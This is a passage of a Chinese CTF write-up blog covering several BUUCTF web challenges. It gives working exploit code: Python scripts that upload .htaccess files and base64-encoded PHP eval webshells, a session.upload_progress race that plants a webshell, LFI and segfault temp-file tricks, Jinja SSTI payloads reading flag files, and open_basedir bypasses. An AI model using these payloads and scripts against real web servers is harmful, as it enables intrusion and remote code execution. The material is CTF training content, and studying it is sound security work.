class="hljs-meta">%</span>ff&#125;<span class="hljs-comment">()</span>;&amp;<span class="hljs-meta">%</span>ff=phpi<span class="hljs-symbol">nfo</span><br></code></pre></td></tr></table></figure><p>phpinfo里就有flag 但是大家还有更多的活儿</p><p>可以利用get_the_flag()接收上传文件 对于exif_imagetype可以通过如下方式来绕过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> width 1337</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> height 1337 </span><br></code></pre></td></tr></table></figure><p>对于 &lt;? 被过滤 这里htaccess 可通过伪协议方式绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ]">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.aaa&quot;<br></code></pre></td></tr></table></figure><p>然后恶意在和 shell.aaa</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GIF89aaa</span>#这里需要补充位数满足<span class="hljs-number">8</span>位 满足<span class="hljs-number">4</span>的倍数<br><span class="hljs-attribute">PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs</span>/Pg==<br></code></pre></td></tr></table></figure><p>需要发送 .htaccess 和 webshell 于是有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = <span class="hljs-string">&quot;http://46ad8e0d-a3be-4fd2-bb3d-5ae6505ff026.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span><br><br>htaccess = <span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">#define width 1000</span><br><span class="hljs-string">#define height 1000 </span><br><span class="hljs-string">AddType application/x-httpd-php .aaa</span><br><span class="hljs-string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.aaa&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>shell = <span class="hljs-string">b&quot;GIF89aaa&quot;</span> + base64.b64encode(<span class="hljs-string">b&quot;&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;</span>)<br><br><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br><br>response = requests.post(url=url,files=files)<br><span class="hljs-built_in">print</span>(response.text)<br><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;shell.aaa&#x27;</span>,shell,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>response = requests.post(url=url,files=files)<br><span class="hljs-built_in">print</span>(response.text)<br><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201282207646.png" alt="image-20220128220709522"></p><p>根据之前的路径访问 成功执行phpinfo但是却执行不了命令</p><p>直接万能的插件即可</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201282209469.png" alt="image-20220128220910391"></p><p>也可以通过多次 chdir来bypass open_basedir</p><p>还是刚刚执行phpinfo的页面 post如下参数</p><p><code>cmd=chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&quot;/&quot;));</code></p><p><code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo(file_get_contents(&#39;/THis_Is_tHe_F14g&#39;));</code></p><h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>tplmap 一把梭</p><p><code>./tplmap.py -u &quot;http://6ba075ff-932c-4ca5-a80a-a7351954182f.node4.buuoj.cn:81/?name=1&quot;  --os-shell</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201272134734.png" alt="image-20220127213413628"></p><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="hljs-variable">$input</span>))&#123;<br>        <span class="hljs-comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$input</span>))&#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$output</span>)&#123;<br>          <span class="hljs-variable">$input</span>[<span class="hljs-variable">$key</span>] = waf(<span class="hljs-variable">$output</span>);<br>      &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$input</span> = check(<span class="hljs-variable">$input</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$dir</span>))&#123;<br>    mkdir(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;pwd&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;upload&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>        waf(<span class="hljs-variable">$data</span>);<br>        file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$dir</span>&quot;</span> . <span class="hljs-string">&quot;index.php&quot;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以直接短标签 + 反引号命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><span class="hljs-keyword">echo</span>%<span class="hljs-number">09</span>`ls%<span class="hljs-number">09</span>/`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后先看沙盒路径 <code>?action=pwd</code></p><p>然后 传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">action=upload&amp;data=<span class="hljs-meta">&lt;?</span><span class="hljs-keyword">echo</span>%<span class="hljs-number">09</span>`ls%<span class="hljs-number">09</span>/`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现根目录存在 &#x2F;flllllll1112222222lag </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>action=upload&amp;data=<span class="hljs-meta">&lt;?</span><span class="hljs-keyword">echo</span>%<span class="hljs-number">09</span>`cat%<span class="hljs-number">09</span>/flllllll1112222222lag`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281621117.png" alt="image-20220128162116498"></p><p>发现首页提示和cookie的内容</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281621137.png" alt="image-20220128162156030"> </p><p>尝试传参 name&#x3D;1 发现哈希值发生变化，说明name&#x3D;1参与了加盐运算</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281627111.png" alt="image-20220128162710007"></p><p>然后我对1求MD5，传入之后返回一个hash 先说明瞎试的，把这次拿到的hash重新传入 即 57632xx，发现跳转到404page了。没啥线索抓包看看</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281629190.png" alt="image-20220128162926083"></p><p> 发现了这个 <code>flflflflag.php</code> 访问这个页面试试看</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281630054.png" alt="image-20220128163045950"></p><p>有一个 include($_GET[“file”]) 参数</p><p>使用伪协议读取一下源码 <code>file=php://filter/read=convert.base64-encode/resource=flflflflag.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;script language=<span class="hljs-string">&quot;javascript&quot;</span> type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>           window.location.href=<span class="hljs-string">&quot;404.html&quot;</span>;<br>&lt;/script&gt;<br>&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/data|input|zip/is&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);<br>&#125;<br>@<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>这里可以利用PHP 7 Segment fault 特性。当发送含有文件的数据包时PHP崩溃，而临时文件不会被删除  <a href="https://bugs.php.net/bug.php?id=77231">https://bugs.php.net/bug.php?id=77231</a></p><p>构建exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br><span class="hljs-comment">#payload = &quot;&lt;?php eval($_POST[a]);?&gt;&quot;</span><br>payload = <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span><br>file_data=&#123;<br>   <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(payload.encode())<br>&#125;<br>url=<span class="hljs-string">&quot;http://62261363-872f-406d-a83f-042a1bf5c4a1.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br><span class="hljs-keyword">try</span>:<br>    r=requests.post(url=url,files=file_data,allow_redirects=<span class="hljs-literal">False</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br><br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>访问dir.php获取路径</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281654091.png" alt="image-20220128165409006"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281657283.png" alt="image-20220128165703157"></p><p>也可以用  session.upload_progress </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> sys<br>sessid = <span class="hljs-string">&#x27;D3n13d&#x27;</span><br>url=<span class="hljs-string">&#x27;http://62261363-872f-406d-a83f-042a1bf5c4a1.node4.buuoj.cn:81/flflflflag.php&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">session</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>        resp = session.post(url=url, data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&quot;&lt;?php system(&#x27;ls /&#x27;);fputs(fopen(&#x27;cmd.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;<br>        , files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;1.txt&#x27;</span>,f)&#125;<br>        , cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">session</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        response = session.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>?file=/tmp/sess_<span class="hljs-subst">&#123;sessid&#125;</span>&#x27;</span>)<br>        <span class="hljs-comment">#resp = session.post(url=url+sessid,data=data)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+++]retry&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            sys.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        t1 = threading.Thread(target=write, args=(session, ))<br>        t1.daemon = <span class="hljs-literal">True</span><br>        t1.start()<br>        read(session)<br></code></pre></td></tr></table></figure><p>然后访问 cmd.php  post：cmd&#x3D;phpinfo();</p><h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p>存在一个 &#x2F;secret 文件  <code>url/secret?secret=1</code></p><p>然后尝试传入一个很大的数</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281848362.png" alt="image-20220128184811257"></p><p>发现有 RC4加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#脚本链接https://www.cnblogs.com/kevinbruce656/p/12638843.html</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_main</span>(<span class="hljs-params">key = <span class="hljs-string">&quot;init_key&quot;</span>, message = <span class="hljs-string">&quot;init_message&quot;</span></span>):</span><br>    <span class="hljs-comment"># print(&quot;RC4加密主函数&quot;)</span><br>    s_box = rc4_init_sbox(key)<br>    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))<br>    <span class="hljs-keyword">return</span>  crypt<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_init_sbox</span>(<span class="hljs-params">key</span>):</span><br>    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))  <span class="hljs-comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span><br>    <span class="hljs-comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    <span class="hljs-comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span><br>    <span class="hljs-keyword">return</span> s_box<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):</span><br>    <span class="hljs-comment"># print(&quot;调用加密程序成功。&quot;)</span><br>    res = []<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + box[i]) % <span class="hljs-number">256</span><br>        box[i], box[j] = box[j], box[i]<br>        t = (box[i] + box[j]) % <span class="hljs-number">256</span><br>        k = box[t]<br>        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))<br>    <span class="hljs-comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span><br>    cipher = <span class="hljs-string">&quot;&quot;</span>.join(res)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;加密后的字符串是：%s&quot;</span> %quote(cipher))<br>    <span class="hljs-comment">#print(&quot;加密后的输出(经过编码):&quot;)</span><br>    <span class="hljs-comment">#print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span><br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>rc4_main(<span class="hljs-string">&quot;HereIsTreasure&quot;</span>,<span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)<br><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281852545.png" alt="image-20220128185235455"></p><h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>Tp的话可以尝试输错路径来看版本信息</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281853020.png" alt="image-20220128185337938"></p><p>那就找相关的exp 师傅的分析文章 <a href="https://blog.csdn.net/god_zzZ/article/details/104275241">https://blog.csdn.net/god_zzZ/article/details/104275241</a></p><p>大致就是 session 文件名内容可控，可以rce</p><p>然后抓包 改 session session长度为32位 抛去尾缀就是28 str_repeat就好了</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281954989.png" alt="image-20220128195455863"></p><p>然后搜索栏这里搞个一句话</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281949264.png" alt="image-20220128194904133"></p><p>访问     <code>/runtime/session/sess_1111111111111111111111111111.php</code> 发现内容成功载入</p><p>上蚁剑</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201281958990.png" alt="image-20220128195824859"></p><p>但是发现权限不足，经典蚁剑 绕过disable_function插件</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201282002365.png" alt="image-20220128200208231"></p><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>根据首页提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- Here is the real page =w= --&gt;</span><br><span class="hljs-comment">&lt;!-- GFXEIM3YFZYGQ4A= --&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201282003179.png" alt="image-20220128200344062"></p><p>1nD3x.php 一个很黑客的页面 跟进一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>error_reporting(<span class="hljs-number">0</span>); <br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;1nD3x.php&quot;</span>;<br><span class="hljs-variable">$shana</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shana&#x27;</span>];<br><span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br><span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>) &#123; <br>    <span class="hljs-keyword">if</span> (<br>        preg_match(<span class="hljs-string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])<br>        )  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You seem to want to do something bad?&#x27;</span>); <br>&#125;<br><br><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123; <br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; 